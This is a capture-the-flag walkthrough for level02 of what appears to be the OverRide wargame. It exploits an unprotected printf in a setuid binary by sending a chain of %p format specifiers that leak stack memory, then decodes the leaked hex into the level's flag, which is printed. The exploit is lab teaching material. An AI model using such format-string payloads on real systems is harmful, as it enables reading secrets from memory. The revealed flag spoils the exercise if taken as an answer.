### step 1: Decompile with Ghidra

C code is available in the `source` file  

/!\ File in 64 bits : addresses will have 8 bytes instead of the usual 4
```
level02@OverRide:~$ file level02 
level02: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 26.24, BuildID[sha1]=0xf639d5c443e6ff1c50a0f8393461c0befc329e71, not stripped
```

### step 2: Code analysis

- Two buffers are filled with `stdin`
  - `buffer1[12]`
  - `buffer2[14]`

- A Username is asked a fill `buffer1`
- If we try to overflow `buffer1` with more than 12 chars, `buffer2` gets filled. Here is an example with only one long input :  

```
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
--[ Password: *****************************************
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA does not have access!
```

**But we don't get a segfault this way**  
**However we spot an unprotected printf at line 69 in the sources**

- The content of the flag is read and stored in a variable (`file_content`)


### step 3: Exploit printf to read the stack

We can exploit the unprotected printf to read large chunks of the stack and print the memory containing the flag with `%p` in the username field  

%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p

```
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
--[ Password: *****************************************
0x7fffffffe4f0(nil)0x700x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6e80x1f7ff9a080x25702570257025700x70(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x29002570250x602010(nil)0x7ffff7a3d7ed(nil)0x7fffffffe6e80x1000000000x400814(nil)0xec9d7c0ee9efabd3 does not have access!
```

- The following string surround by `\0` can be extracted : `0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d`

=> We spot 5 chunks of 8 chars (16 hex) that could correspond to our 40 char long flag   

- In order to get our flag we have to process this string :
  1) Split the 5 chunks with the separator `0x`
  2) Convert each chunk to little endian
  3) Convert each hex number to a char
  4) Join all converted chunks

- flag : `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`




